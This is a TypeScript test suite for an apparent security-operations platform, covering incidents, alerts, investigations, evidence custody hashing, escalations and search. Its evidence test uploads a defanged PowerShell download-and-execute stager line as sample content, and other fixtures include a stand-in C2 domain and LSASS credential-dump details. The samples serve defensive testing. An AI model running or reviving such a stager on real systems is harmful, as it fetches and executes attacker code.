import { createHash } from "node:crypto";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { api, call, createTenant, createTestApp, createUser, credentialTheftChain, dnsEvent, login, minutesAgo, uniq, type Json, type TestApp, type TestTenant } from "../test/harness.js";
import { verifyCustody } from "./investigations.js";

let t: TestApp;
let tenant: TestTenant;
let o1: string;
let o2: string;
let admin: ReturnType<typeof api>;
let analyst: { id: string; client: ReturnType<typeof api> };
let correlated: Json;

beforeAll(async () => {
  t = await createTestApp();
  tenant = await createTenant(t, { orgs: 2 });
  [o1, o2] = tenant.orgIds as [string, string];
  admin = api(t.app, { token: (await login(t.app, tenant.admin.email)).token });
  const user = await createUser(t, tenant.tenantId, { roles: [{ role: "soc_analyst_t2", organizationId: null }], displayName: "Tier Two" });
  analyst = { id: user.id, client: api(t.app, { token: (await login(t.app, user.email)).token }) };

  await t.db.withTenant(tenant.tenantId, (tx) =>
    t.services.inventory.upsertIndicator(tx, tenant.tenantId, { organizationId: null, type: "domain", value: "evil-c2.example", confidence: 80, severity: "high", source: "opencti", threatActor: "TA-SEARCH-9", campaign: "Operation Searchlight" }),
  );
  const ingest = await admin.post("/ingest/events", { organizationId: o1, events: [...credentialTheftChain("ws-alpha"), dnsEvent("ws-alpha", minutesAgo(26), "10.1.2.3", "evil-c2.example")] });
  expect(ingest.body.accepted).toBe(4);
  await t.services.bus.drain();
  correlated = (await admin.get(`/incidents?organizationId=${o1}`)).body.items[0];
  expect(correlated).toBeTruthy();
});
afterAll(async () => {
  await t?.close();
});

describe("incidents", () => {
  it("lists with filters, number search, severity sort and keyset pagination", async () => {
    for (const [severity, title] of [
      ["low", "Low noise"],
      ["medium", "Medium thing"],
      ["high", "High thing"],
    ] as const) {
      expect((await admin.post("/incidents", { organizationId: o2, title, severity, summary: `${title} summary` })).status).toBe(201);
    }
    const bySeverity = await admin.get(`/incidents?organizationId=${o2}&sort=severity`);
    expect(bySeverity.body.items.map((i: Json) => i.severity)).toEqual(["high", "medium", "low"]);
    expect((await admin.get("/incidents?severity=critical")).body.items.map((i: Json) => i.id)).toEqual([correlated.id]);
    expect((await admin.get(`/incidents?q=%23${correlated.number}`)).body.items.map((i: Json) => i.id)).toEqual([correlated.id]);
    expect((await admin.get("/incidents?q=medium%20THING")).body.items).toHaveLength(1);
    expect((await admin.get("/incidents?status=active&assigneeId=unassigned")).body.items).toHaveLength(4);
    expect((await admin.get("/incidents?status=bogus")).status).toBe(400);

    const seen: string[] = [];
    let cursor: string | null = null;
    do {
      const page: Json = await admin.get(`/incidents?limit=1&sort=number${cursor ? `&cursor=${cursor}` : ""}`);
      seen.push(...page.body.items.map((i: Json) => i.number));
      cursor = page.body.nextCursor;
    } while (cursor);
    expect(seen).toEqual([4, 3, 2, 1]);
    expect(bySeverity.body.items[0]).toMatchObject({ organizationName: expect.stringContaining("Customer 2") });
  });

  it("enforces the lifecycle and stamps SLA timestamps", async () => {
    const inc = (await admin.post("/incidents", { organizationId: o2, title: "Lifecycle test", severity: "medium" })).body;
    expect(inc.allowedTransitions).toEqual(["triage", "investigating", "contained", "remediated", "closed", "false_positive"]);
    const triage = await analyst.client.patch(`/incidents/${inc.id}`, { status: "triage" });
    expect(triage.body).toMatchObject({ status: "triage", acknowledgedAt: expect.any(String), containedAt: null });
    const contained = await analyst.client.patch(`/incidents/${inc.id}`, { status: "contained" });
    expect(contained.body.containedAt).not.toBeNull();
    const invalid = await analyst.client.patch(`/incidents/${inc.id}`, { status: "new" });
    expect(invalid.status).toBe(409);
    expect(invalid.body.error).toMatchObject({ code: "invalid_transition", details: { from: "contained" } });
    const closed = await analyst.client.patch(`/incidents/${inc.id}`, { status: "closed" });
    expect(closed.body.closedAt).not.toBeNull();
    const reopened = await analyst.client.patch(`/incidents/${inc.id}`, { status: "investigating", severity: "critical" });
    expect(reopened.body).toMatchObject({ status: "investigating", closedAt: null, severity: "critical" });
    expect(reopened.body.escalations).toHaveLength(1); // raised to critical → escalated
    expect(Date.parse(reopened.body.acknowledgedAt)).toBe(Date.parse(triage.body.acknowledgedAt));
    expect((await analyst.client.patch(`/incidents/${inc.id}`, {})).status).toBe(400);
    expect((await analyst.client.patch(`/incidents/${inc.id}`, { number: 7 })).status).toBe(400);

    const audit = await t.privileged.query("SELECT action, details FROM audit_log WHERE tenant_id = $1 AND target_id = $2 ORDER BY seq", [tenant.tenantId, inc.id]);
    // Successful changes carry a diff; rejected attempts (409 transition, 400 validation) are audited as failures.
    expect(audit.rows.map((r) => r.action)).toEqual([
      "incident.created",
      "incident.status_changed",
      "incident.status_changed",
      "patch /api/v1/incidents/:id",
      "incident.status_changed",
      "incident.status_changed",
      "patch /api/v1/incidents/:id",
      "patch /api/v1/incidents/:id",
    ]);
    expect(audit.rows[1].details.changes.status).toEqual({ from: "new", to: "triage" });
    expect(audit.rows[3].details).toEqual({ status: 409 });
  });

  it("keeps internal notes from customer viewers", async () => {
    expect((await analyst.client.post(`/incidents/${correlated.id}/notes`, { body: "Internal: attacker used comsvcs." })).status).toBe(201);
    expect((await analyst.client.post(`/incidents/${correlated.id}/notes`, { body: "We isolated the workstation.", visibility: "customer" })).status).toBe(201);
    const viewer = await createUser(t, tenant.tenantId, { organizationId: o1, roles: [{ role: "customer_viewer", organizationId: o1 }] });
    const viewerClient = api(t.app, { token: (await login(t.app, viewer.email)).token });
    expect((await viewerClient.get(`/incidents/${correlated.id}/notes`)).body.items.map((n: Json) => n.body)).toEqual(["We isolated the workstation."]);
    expect((await analyst.client.get(`/incidents/${correlated.id}/notes`)).body.items).toHaveLength(2);
    // The viewer's incident detail omits data its role cannot read.
    const detail = (await viewerClient.get(`/incidents/${correlated.id}`)).body;
    expect(detail.alerts).toEqual([]);
    expect(detail.investigations).toEqual([]);
    expect(detail.assets.length).toBe(1); // customer_viewer holds asset:read
  });
});

describe("alerts", () => {
  it("lists, shows source events and records analyst verdicts", async () => {
    const list = await analyst.client.get(`/alerts?incidentId=${correlated.id}&sort=risk`);
    expect(list.body.items.length).toBeGreaterThanOrEqual(4);
    const risks = list.body.items.map((a: Json) => a.riskScore);
    expect(risks).toEqual([...risks].sort((a, b) => b - a));
    const alert = list.body.items[0];
    const detail = await analyst.client.get(`/alerts/${alert.id}`);
    expect(detail.body.events.length).toBe(alert.eventIds.length);
    expect((await analyst.client.patch(`/alerts/${alert.id}`, { status: "triaged" })).status).toBe(400); // promoted alerts only flip to false_positive
    const fp = await analyst.client.patch(`/alerts/${alert.id}`, { status: "false_positive", reason: "Pentest" });
    expect(fp.body.status).toBe("false_positive");
    expect((await analyst.client.get("/alerts?status=false_positive")).body.items.map((a: Json) => a.id)).toEqual([alert.id]);
    expect((await analyst.client.get("/alerts?ruleId=bloody-edr-lsass-credential-access")).body.items).toHaveLength(1);
  });
});

describe("investigations, evidence and chain of custody", () => {
  let inv: Json;

  it("opens an investigation seeded with the incident's detections", async () => {
    const res = await analyst.client.post("/investigations", { incidentId: correlated.id, title: "Credential theft on ws-alpha", hypothesis: "Phishing led to LSASS dump", leadId: analyst.id });
    expect(res.status).toBe(201);
    inv = res.body;
    expect(inv).toMatchObject({ organizationId: o1, incidentId: correlated.id, status: "open", leadId: analyst.id });
    const incident = (await analyst.client.get(`/incidents/${correlated.id}`)).body;
    expect(incident.status).toBe("investigating");
    expect(incident.acknowledgedAt).not.toBeNull();
    const detail = (await analyst.client.get(`/investigations/${inv.id}`)).body;
    expect(detail.timeline[0]).toMatchObject({ kind: expect.stringMatching(/alert|status_change/) });
    expect(detail.timeline.filter((e: Json) => e.kind === "alert").length).toBe(incident.alertCount);
    expect(detail.incident.id).toBe(correlated.id);
    expect((await analyst.client.get(`/investigations?incidentId=${correlated.id}`)).body.items[0]).toMatchObject({ id: inv.id, incidentNumber: correlated.number, openTasks: 0, evidenceCount: 0 });
    expect((await analyst.client.post("/investigations", { title: "no org" })).status).toBe(400);
  });

  it("captures notes, tasks and manual timeline entries", async () => {
    expect((await analyst.client.post(`/investigations/${inv.id}/notes`, { body: "Confirmed MiniDump of PID 652.\nDetails follow." })).status).toBe(201);
    const task = await analyst.client.post(`/investigations/${inv.id}/tasks`, { title: "Reset cached credentials", assigneeId: analyst.id, dueAt: new Date(Date.now() - 60_000).toISOString() });
    expect(task.body).toMatchObject({ status: "open", overdue: true });
    const done = await analyst.client.patch(`/investigations/${inv.id}/tasks/${task.body.id}`, { status: "done" });
    expect(done.body).toMatchObject({ status: "done", completedAt: expect.any(String), overdue: false });
    expect((await analyst.client.post(`/investigations/${inv.id}/timeline`, { kind: "action", title: "Requested host isolation", at: minutesAgo(5) })).status).toBe(201);
    expect((await analyst.client.post(`/investigations/${inv.id}/timeline`, { kind: "status_change", title: "forged" })).status).toBe(400);
    const timeline = (await analyst.client.get(`/investigations/${inv.id}/timeline`)).body.items;
    expect(timeline.map((e: Json) => e.title)).toEqual(expect.arrayContaining(["Confirmed MiniDump of PID 652.", "Task created: Reset cached credentials", "Task done: Reset cached credentials", "Requested host isolation"]));
    const times = timeline.map((e: Json) => Date.parse(e.at));
    expect(times).toEqual([...times].sort((a, b) => a - b));
  });

  it("stores evidence with a verified sha256 and an append-only custody chain", async () => {
    const content = Buffer.from("defanged stager: iwr hxxp://198.51.100[.]23/inv.ps1 | iex\n");
    const inline = await analyst.client.post(`/investigations/${inv.id}/evidence`, { name: "stager.ps1", kind: "file", contentBase64: content.toString("base64"), tags: ["stager"] });
    expect(inline.status).toBe(201);
    expect(inline.body).toMatchObject({ sha256: createHash("sha256").update(content).digest("hex"), sizeBytes: content.length, inline: true, custodyVerification: { valid: true } });
    expect(inline.body.custody).toEqual([expect.objectContaining({ actor: `user:${analyst.id}`, action: "collected:uploaded" })]);

    const external = await analyst.client.post(`/investigations/${inv.id}/evidence`, { name: "lsass.dmp", kind: "memory", sha256: "A".repeat(64), sizeBytes: 48_234_496, storageRef: "velociraptor://C.123/F.456/lsass.dmp" });
    expect(external.status).toBe(201);
    expect(external.body.sha256).toBe("a".repeat(64));
    expect((await analyst.client.post(`/investigations/${inv.id}/evidence`, { name: "x", kind: "file", sha256: "a".repeat(64), sizeBytes: 1, storageRef: "http://evil.example/x" })).status).toBe(400);
    expect((await analyst.client.post(`/investigations/${inv.id}/evidence`, { name: "x", kind: "file" })).status).toBe(400);

    const custody = await analyst.client.post(`/investigations/${inv.id}/evidence/${external.body.id}/custody`, { action: "transferred", note: "Handed to forensics lab" });
    expect(custody.body.custody.map((c: Json) => c.action)).toEqual(["collected:registered", "transferred"]);
    expect(custody.body.custodyVerification.valid).toBe(true);

    const download = await call(t.app, "GET", `/investigations/${inv.id}/evidence/${inline.body.id}/content`, { auth: { token: (await login(t.app, tenant.admin.email)).token } });
    expect(download.status).toBe(200);
    expect(download.text).toBe(content.toString());
    expect(download.headers["x-evidence-sha256"]).toBe(inline.body.sha256);
    expect(download.headers["content-disposition"]).toBe('attachment; filename="stager.ps1"');
    const after = (await analyst.client.get(`/investigations/${inv.id}/evidence/${inline.body.id}`)).body;
    expect(after.custody.map((c: Json) => c.action)).toEqual(["collected:uploaded", "accessed:downloaded"]);
    expect(verifyCustody(after.sha256, after.custody)).toEqual({ valid: true, brokenAt: null });
    expect(verifyCustody(after.sha256, [after.custody[1], after.custody[0]]).valid).toBe(false);
    expect((await analyst.client.get(`/investigations/${inv.id}/evidence/${external.body.id}/content`)).status).toBe(409);

    // The database itself refuses to rewrite evidence identity or custody history.
    await expect(t.db.withTenant(tenant.tenantId, (tx) => tx.query("UPDATE evidence SET sha256 = $2 WHERE id = $1", [inline.body.id, "b".repeat(64)]))).rejects.toThrow(/immutable/);
    await expect(t.db.withTenant(tenant.tenantId, (tx) => tx.query("UPDATE evidence SET custody = '[]'::jsonb WHERE id = $1", [inline.body.id]))).rejects.toThrow(/append-only/);
    await expect(t.db.withTenant(tenant.tenantId, (tx) => tx.query("DELETE FROM evidence WHERE id = $1", [inline.body.id]))).rejects.toThrow(/cannot be deleted/);
  });

  it("closes the investigation and freezes evidence collection", async () => {
    const closed = await analyst.client.patch(`/investigations/${inv.id}`, { status: "closed" });
    expect(closed.body).toMatchObject({ status: "closed", closedAt: expect.any(String) });
    const late = await analyst.client.post(`/investigations/${inv.id}/evidence`, { name: "late.txt", kind: "note", contentBase64: Buffer.from("x").toString("base64") });
    expect(late.status).toBe(409);
    const detail = (await analyst.client.get(`/investigations/${inv.id}`)).body;
    expect(detail.evidence).toHaveLength(2);
    expect(detail.tasks).toHaveLength(1);
    expect(detail.notes).toHaveLength(1);
  });
});

describe("escalations", () => {
  it("defaults the due time by severity, computes overdue and enforces the ack/resolve flow", async () => {
    const before = Date.now();
    const esc = await analyst.client.post("/escalations", { organizationId: o2, title: "Customer: approve firewall change", severity: "high" });
    expect(esc.status).toBe(201);
    expect(Date.parse(esc.body.dueAt) - before).toBeGreaterThanOrEqual(59 * 60_000);
    expect(Date.parse(esc.body.dueAt) - before).toBeLessThanOrEqual(61 * 60_000);
    expect(esc.body).toMatchObject({ status: "open", overdue: false });
    expect((await analyst.client.post("/escalations", { organizationId: o2, title: "past due", severity: "low", dueAt: new Date(Date.now() - 1000).toISOString() })).status).toBe(400);

    await t.privileged.query("UPDATE escalations SET due_at = now() - interval '1 minute' WHERE id = $1", [esc.body.id]);
    expect((await analyst.client.get(`/escalations/${esc.body.id}`)).body.overdue).toBe(true);
    expect((await analyst.client.get("/escalations?overdue=true")).body.items.map((e: Json) => e.id)).toEqual([esc.body.id]);

    const ack = await analyst.client.post(`/escalations/${esc.body.id}/acknowledge`, { note: "Calling the customer" });
    expect(ack.body).toMatchObject({ status: "acknowledged", acknowledgedBy: `user:${analyst.id}`, overdue: true });
    expect((await analyst.client.post(`/escalations/${esc.body.id}/acknowledge`)).status).toBe(409);
    const resolved = await analyst.client.post(`/escalations/${esc.body.id}/resolve`, { note: "Approved by phone" });
    expect(resolved.body).toMatchObject({ status: "resolved", overdue: false, resolvedBy: `user:${analyst.id}`, resolutionNote: "Approved by phone" });
    expect((await analyst.client.post(`/escalations/${esc.body.id}/resolve`)).status).toBe(409);
    const audit = await t.privileged.query("SELECT details FROM audit_log WHERE tenant_id = $1 AND action = 'escalation.resolved' AND target_id = $2", [tenant.tenantId, esc.body.id]);
    expect(audit.rows[0].details.late).toBe(true);

    const open = await analyst.client.get("/escalations?status=open,acknowledged");
    expect(open.body.items.every((e: Json) => e.status !== "resolved")).toBe(true);
    const all = await analyst.client.get("/escalations");
    const statuses = all.body.items.map((e: Json) => e.status);
    expect(statuses.indexOf("resolved")).toBeGreaterThan(statuses.lastIndexOf("open"));
  });
});

describe("global search", () => {
  it("finds incidents, assets, alerts, indicators and graph observables, ranked by match quality", async () => {
    const byNumber = await analyst.client.get(`/search?q=%23${correlated.number}`);
    expect(byNumber.body.items[0]).toMatchObject({ kind: "incident", id: correlated.id, match: 0 });
    const host = await analyst.client.get("/search?q=ws-alpha");
    expect(host.body.items[0]).toMatchObject({ kind: "asset", title: "ws-alpha", match: 0 });
    const actor = await analyst.client.get("/search?q=TA-SEARCH-9&kinds=indicator");
    expect(actor.body.items).toEqual([expect.objectContaining({ kind: "indicator", title: "evil-c2.example", organizationName: "All organizations" })]);
    expect(actor.body.searchedKinds).toEqual(["indicator"]);
    const observable = await analyst.client.get("/search?q=evil-c2&kinds=observable");
    expect(observable.body.items.map((h: Json) => h.kind)).toContain("domain");
    const alerts = await analyst.client.get("/search?q=lsass&kinds=alert");
    expect(alerts.body.items.length).toBeGreaterThan(0);
    expect((await analyst.client.get("/search?q=a")).status).toBe(400);
    expect(host.body.byKind.asset).toBeGreaterThanOrEqual(1);
  });

  it("skips kinds the caller may not read", async () => {
    const exec = await createUser(t, tenant.tenantId, { roles: [{ role: "executive", organizationId: null }] });
    const res = await api(t.app, { token: (await login(t.app, exec.email)).token }).get("/search?q=ws-alpha");
    expect(res.body.searchedKinds).toEqual(["incident", "vulnerability"]);
    expect(res.body.items.every((h: Json) => h.kind === "incident" || h.kind === "vulnerability")).toBe(true);
  });
});

describe("error envelope", () => {
  it("returns uniform 404s for unknown routes and malformed ids", async () => {
    const missing = await analyst.client.get("/does-not-exist");
    expect(missing.status).toBe(404);
    expect(missing.body.error).toMatchObject({ code: "route_not_found", requestId: expect.any(String) });
    expect((await analyst.client.get("/incidents/not-a-uuid")).status).toBe(400);
    expect((await analyst.client.get(`/incidents/${uniq("x").replace(/.*/, "00000000-0000-4000-8000-000000000000")}`)).status).toBe(404);
  });
});
